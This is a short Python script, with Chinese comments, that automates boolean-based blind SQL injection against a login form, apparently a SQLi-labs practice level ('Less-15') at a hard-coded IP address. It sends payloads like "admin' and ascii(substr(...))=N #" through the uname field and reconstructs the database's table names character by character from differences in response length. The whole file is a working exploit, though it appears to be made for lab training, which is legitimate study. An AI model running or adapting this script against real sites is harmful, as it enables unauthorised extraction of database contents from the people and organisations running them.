import requests

chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&%/^!~"
result = ""

def get_length(value):  #获取要查询的数据的长度
    for n in range(1,100):
        payload = "admin' and length(({0})) ={1} #".format(data_payload,n)
        data = {"uname":payload,"passwd":"admin"}
        html = requests.post(url,data=data)
        length = len(html.text)
        if length >value:
            print("……data length is :" + str(n))
            return  n

def get_data(data_length,value): #获取数据
    global result
    for i in range(1,data_length):
        for char in chars:
            payload = "admin'and ascii(substr(({0}),{1},1))={2} #".format(data_payload,i,ord(char))
            data = {"uname":payload,"passwd":"admin"}
            html = requests.post(url,data=data)
            length = len(html.text)
            if length>value:         #根据返回长度的不同来判断字符正确与否
                result += char
                print("…… data is :"+ result)
                break


url = "http://43.247.91.228:84/Less-15/"
data_payload = "select group_concat(table_name)from information_schema.tables where table_schema = database()"
value = 1460     # 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看

length = get_length(value) +1
get_data(length,value)
print(result)




